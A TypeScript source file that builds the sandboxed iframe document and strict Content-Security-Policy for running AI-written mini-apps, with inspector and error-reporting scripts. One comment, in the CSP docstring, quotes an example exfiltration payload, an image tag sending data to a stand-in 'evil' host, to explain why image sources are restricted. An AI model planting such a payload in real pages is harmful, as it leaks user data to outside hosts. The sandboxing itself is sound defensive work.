/**
 * The mini-app sandbox FRAME document — the HTML a sandboxed iframe navigates
 * to (GET /api/apps/[id]/frame or /s/[token]/frame). Pure string building, no
 * DOM: the SERVER renders this, which is the point of the design. The old
 * client-built `srcdoc` approach assigned the document to an iframe already in
 * the DOM, and that assignment could race the element's initial about:blank
 * navigation and be silently dropped (the "Loading… forever" bug). A `src`
 * navigation to this route cannot be lost, the CSP rides a response header
 * instead of a <meta> tag, and the document is curl-able and cacheable.
 *
 * The iframe stays `sandbox="allow-scripts"` (opaque origin): the app gets no
 * cookies, no storage, no parent DOM. Its only egress is the postMessage
 * bridge to the parent AppSandbox, which brokers tool + sqlite calls
 * server-side.
 */

/** The strict sandbox CSP, served as a Content-Security-Policy HEADER on the
 *  frame response. The app may only render — NO network of its own.
 *  `connect-src 'none'` blocks fetch/XHR/WebSocket, and img/font loads are
 *  network too, so they're held to inline sources (data:/blob:) plus the HOST
 *  ORIGIN only — a wildcard would be an exfil channel
 *  (`<img src="https://evil/?d=…">`) despite connect-src 'none'. Same-origin
 *  images are deliberately allowed (Mantle is single-tenant; a request to our
 *  own server leaks nothing) so apps can show brain images and share
 *  attachments. The document's origin is OPAQUE (sandboxed), so CSP `'self'`
 *  is unreliable here — every source names the host origin explicitly:
 *  scripts only from `/app-runtime/` (the shared React/kit/host runtime the
 *  import map points at), styles/fonts only from `/share-runtime/` (the
 *  self-contained stylesheet the frame links) and `/fonts/` (owner font
 *  library). */
export function buildAppFrameCsp(origin: string): string {
  return (
    // `sandbox allow-scripts` is the load-bearing directive: it sandboxes the
    // DOCUMENT itself (opaque origin, no cookies/storage), not just the iframe
    // that embeds it. Without it, opening the frame URL directly in a tab —
    // it IS a real URL now — would run AI-written app code on the true server
    // origin. With it, the frame is opaque-origin no matter how it's reached;
    // inside the AppSandbox iframe it composes with the identical attribute.
    `sandbox allow-scripts; ` +
    `default-src 'none'; style-src 'unsafe-inline' ${origin}/share-runtime/; ` +
    // share-runtime scripts joined app-runtime for the Neat backdrop
    // (share-page.js + its lazy WebGL chunk) — same-origin built assets,
    // no new capability.
    `script-src 'unsafe-inline' ${origin}/app-runtime/ ${origin}/share-runtime/; ` +
    `img-src data: blob: ${origin}; ` +
    `font-src data: ${origin}/share-runtime/ ${origin}/fonts/; ` +
    "connect-src 'none'; base-uri 'none'; form-action 'none'"
  );
}

// Host-injected "inspect mode" overlay. Lives in the iframe but is NOT part of
// the app bundle, so it works on every app with no rebuild and stays a host
// concern. When the parent posts {kind:'inspect',on:true}, hovering outlines the
// nearest [data-app-region] ancestor and clicking locks it (clicking the same
// one clears it). The locked region is posted back as {kind:'select'}; the
// parent feeds it to Appsmith as focusRegionIds. Esc exits. Pure DOM, defensive.
// It also applies parent-posted {kind:'theme'} updates so a live theme switch
// restyles a running app without a reload.
const INSPECTOR = `
(function(){
  var on=false, locked=null, hovered=null, lbl=null;
  function regionOf(el){
    while(el && el.nodeType===1 && el!==document.body){
      if(el.getAttribute && el.hasAttribute('data-app-region')) return el;
      el=el.parentElement;
    }
    return null;
  }
  function q(id){ try{ return id ? document.querySelector('[data-app-region="'+(window.CSS&&CSS.escape?CSS.escape(id):id)+'"]') : null; }catch(e){ return null; } }
  function label(){
    if(!lbl){
      lbl=document.createElement('div');
      lbl.style.cssText='position:fixed;z-index:2147483647;pointer-events:none;display:none;font:500 11px/1.4 ui-sans-serif,system-ui,sans-serif;padding:2px 6px;border-radius:4px;background:var(--ring,#3b82f6);color:#fff;box-shadow:0 1px 4px rgba(0,0,0,.35);white-space:nowrap;';
      document.body.appendChild(lbl);
    }
    return lbl;
  }
  function paintLocked(){
    var prev=document.querySelectorAll('[data-app-locked]');
    for(var i=0;i<prev.length;i++){ prev[i].removeAttribute('data-app-locked'); prev[i].style.outline=''; prev[i].style.outlineOffset=''; }
    var el=q(locked);
    if(el){ el.setAttribute('data-app-locked','1'); el.style.outline='2px solid var(--ring,#3b82f6)'; el.style.outlineOffset='1px'; }
  }
  function clearHover(){
    if(hovered && !hovered.hasAttribute('data-app-locked')){ hovered.style.outline=''; hovered.style.outlineOffset=''; }
    hovered=null;
    if(lbl) lbl.style.display='none';
  }
  function onMove(e){
    if(!on) return;
    var el=regionOf(e.target);
    if(el===hovered) return;
    clearHover();
    if(!el) return;
    hovered=el;
    if(!el.hasAttribute('data-app-locked')){ el.style.outline='2px dashed var(--ring,#3b82f6)'; el.style.outlineOffset='1px'; }
    var r=el.getBoundingClientRect(), L=label();
    L.textContent=el.getAttribute('data-app-region');
    L.style.display='block';
    L.style.left=Math.max(2,r.left)+'px';
    L.style.top=Math.max(2,r.top-20)+'px';
  }
  function onClick(e){
    if(!on) return;
    var el=regionOf(e.target);
    if(!el) return;
    e.preventDefault(); e.stopPropagation(); if(e.stopImmediatePropagation) e.stopImmediatePropagation();
    var id=el.getAttribute('data-app-region');
    locked=(locked===id)?null:id;
    clearHover(); paintLocked();
    window.parent.postMessage({ v:1, kind:'select', regionId:locked, label:locked }, '*');
    onMove(e);
  }
  function setOn(v){ on=v; document.body.style.cursor=v?'crosshair':''; if(!v) clearHover(); }
  window.addEventListener('message', function(e){
    if(e.source!==window.parent) return;
    var m=e.data; if(!m||m.v!==1) return;
    if(m.kind==='inspect'){ setOn(!!m.on); return; }
    if(m.kind==='select'){ locked=m.regionId||null; clearHover(); paintLocked(); return; }
    if(m.kind==='theme'){ var h=document.documentElement; h.className=m.cls||''; if(m.colorTheme){ h.setAttribute('data-color-theme', m.colorTheme); } else { h.removeAttribute('data-color-theme'); } return; }
  });
  document.addEventListener('mousemove', onMove, true);
  document.addEventListener('click', onClick, true);
  document.addEventListener('keydown', function(e){ if(on && e.key==='Escape'){ setOn(false); window.parent.postMessage({v:1,kind:'inspect',on:false},'*'); } });
})();
`;

/** HTML-attribute escape for the theme values baked into the <html> tag —
 *  they arrive as query params, so they are untrusted for MARKUP purposes
 *  even though a wrong theme is harmless. */
function attr(v: string): string {
  return v.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;');
}

/**
 * Error reporter, installed BEFORE the app module so it can see the app fail
 * during boot.
 *
 * A module-level failure — a link error like `does not provide an export named
 * 'default'`, or a throw at module scope — happens before any component
 * renders, so the kit's ErrorBoundary cannot exist yet, let alone catch it.
 * Nothing was reported, the app never posted `ready`, and the parent could only
 * sit out its 10s watchdog, retry once, and show a causeless "couldn't load the
 * app" some twenty seconds later — the same blank wall for a typo, a dead
 * chunk, or a real crash. Now the parent has the actual reason in milliseconds.
 *
 * `error` on window catches both cases: module link/parse errors surface there
 * even though no user code ran. Capture phase, because a module script's error
 * event does not bubble.
 *
 * It deliberately does NOT try to decide whether the app had already booted —
 * `ready` goes to the (cross-origin) parent, so this document never sees it,
 * and `window.parent.postMessage` cannot be wrapped to eavesdrop. The PARENT
 * already tracks that (`everReadyRef` in app-sandbox) and is the right place to
 * classify: pre-ready error = load failure, post-ready = runtime hiccup. So
 * this reports faithfully and lets the parent judge.
 */
const ERROR_REPORTER = `(function(){
  var last = '';
  function report(msg){
    var text = String(msg || 'the app failed to start');
    if (text === last) return;   // a repeating error must not become a message loop
    last = text;
    try { window.parent.postMessage({ v:1, kind:'error', message: text }, '*'); } catch (_) {}
  }
  window.addEventListener('error', function(e){
    // Subresource load failures (img/link) target an element, not window, and
    // are not app failures — ignore them.
    if (e && e.target && e.target !== window && e.target.tagName) return;
    report((e && (e.message || (e.error && e.error.message))) || 'the app failed to start');
  }, true);
  window.addEventListener('unhandledrejection', function(e){
    report((e && e.reason && (e.reason.message || e.reason)) || 'the app failed to start');
  });
})();`;

export function buildAppFrameHtml(opts: {
  /** The app's built module bundle (esbuild output; esbuild escapes any
   *  `</script` inside string literals, so inlining it is safe). */
  bundleCode: string;
  /** Per-app compiled Tailwind utilities ('' when the build predates CSS). */
  appCss: string;
  /** The shared-runtime import map JSON (specifier → hashed /app-runtime URL). */
  importMapJson: string;
  /** Theme parity, baked at mint time: the host page's <html> class and
   *  data-color-theme. Live changes arrive via the postMessage theme sync. */
  cls: string;
  colorTheme: string | null;
  /** Viewport frame (iframe IS the viewport) vs card frame (auto-sized). */
  viewport: boolean;
  /** The brain's saved Neat background spec (canonical encoding), or
   *  null/absent for the plain themed ground. Resolved server-side by the
   *  frame route — owner frames from the prefs alone, shared frames gated by
   *  the shareNeat switch. */
  neatSpec?: string | null;
  /** Neat licence key for watermark removal — same env-sourced value the
   *  other surfaces ride. */
  neatLicense?: string | null;
}): string {
  const colorThemeAttr = opts.colorTheme ? ` data-color-theme="${attr(opts.colorTheme)}"` : '';
  return `<!doctype html>
<html class="${attr(opts.cls)}"${colorThemeAttr}>
<head>
<meta charset="utf-8" />
<script type="importmap">${opts.importMapJson}</script>
<link rel="stylesheet" href="/share-runtime/styles.css" />
<link rel="stylesheet" href="/share-runtime/katex/katex.min.css" />
<style>${
    /* Per-app compiled utilities — classes the app's own source uses that
   the shared sheet never scanned. After the shared styles so its @layer order
   is already established. The `</` guard keeps CSS content (arbitrary values
   can hold strings) from closing the tag; the app already runs its own JS in
   this iframe, so this is markup hygiene, not a security boundary. */
    opts.appCss.replace(/<\//g, '<\\/')
  }</style>
<style>/* Paint the iframe canvas with the theme background, NOT transparent: a
   sandboxed (opaque-origin) iframe renders WHITE where it's transparent, so any
   gap between the app content and the iframe height showed a white strip. With
   the themed background, any such gap is invisible (matches the app + host).
   The ground lives on BODY with html left transparent — the /s reader's exact
   arrangement, and load-bearing for the Neat backdrop: a body background on a
   transparent html PROPAGATES to the canvas, painted beneath everything
   including the backdrop's z-index:-1 host, while a background on html (or a
   non-propagating body background) paints in the normal layers, above the
   backdrop, and hides it. */
html,body{margin:0}body{background:var(--background)}#root{padding:0}
/* Themed scrollbars for the WHOLE app. The host only styles scrollbars behind an
   opt-in .scrollbar-thin class, so an app's own scroll containers otherwise fall
   back to the default wide OS scrollbar with a white/grey track that clashes with
   the theme. Apply the thin, theme-token look to every scroller inside the iframe
   (scoped here, so the host is untouched). Vars resolve from the linked theme. */
*{scrollbar-width:thin;scrollbar-color:color-mix(in oklab,var(--muted-foreground) 30%,transparent) transparent}
::-webkit-scrollbar{width:10px;height:10px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background-color:color-mix(in oklab,var(--muted-foreground) 30%,transparent);border-radius:6px;border:2px solid transparent;background-clip:padding-box}
::-webkit-scrollbar-thumb:hover{background-color:color-mix(in oklab,var(--muted-foreground) 50%,transparent);background-clip:padding-box}
::-webkit-scrollbar-corner{background:transparent}
${
  opts.viewport
    ? `/* Viewport frame: the iframe IS the viewport, so viewport-height utilities
   are real and the app owns its own layout + scrolling. Full-height plumbing
   so h-full works from the root down. */
html,body,#root{height:100%}
body{overflow:auto}`
    : `/* Card frame: the app is embedded in an auto-sized iframe with no real
   viewport, so viewport-height utilities would inflate it into a tall,
   mostly-empty box (a small app leaves a big blank area below). Collapse them
   to content height — the iframe then hugs the actual content. Belt-and-braces
   with the authoring rule that tells Appsmith not to use these. */
.min-h-screen,.min-h-dvh,.min-h-svh,.min-h-lvh{min-height:0!important}
.h-screen,.h-dvh,.h-svh,.h-lvh{height:auto!important}`
}</style>
</head>
<body class="text-foreground">
${
  /* The brain's saved Neat gradient, rendered INSIDE the frame document —
     the iframe is opaque-origin (sandbox without allow-same-origin), so
     transparency renders WHITE and the host page's backdrop can never show
     through; the only way the background "transfers" into an app is to
     paint it here. Same host-div + share-page.js contract as the /s reader
     (no mode toggle mounts — that requires the reader's
     data-share-mode-default, which frames deliberately lack), and the
     runtime's class observer repaints it when the parent posts a theme
     change. z-index:-1 sits above the html ground (the canvas layer) and
     below all app content. */
  opts.neatSpec
    ? `<div data-neat-spec="${attr(opts.neatSpec)}"${
        opts.neatLicense ? ` data-neat-license="${attr(opts.neatLicense)}"` : ''
      } style="position:fixed;inset:0;z-index:-1;pointer-events:none" aria-hidden="true"></div>\n`
    : ''
}<div id="root"></div>
<script>${ERROR_REPORTER}</script>
<script type="module">${opts.bundleCode}</script>
<script>${INSPECTOR}</script>
${opts.neatSpec ? `<script type="module" src="/share-runtime/share-page.js"></script>\n` : ''}</body>
</html>`;
}
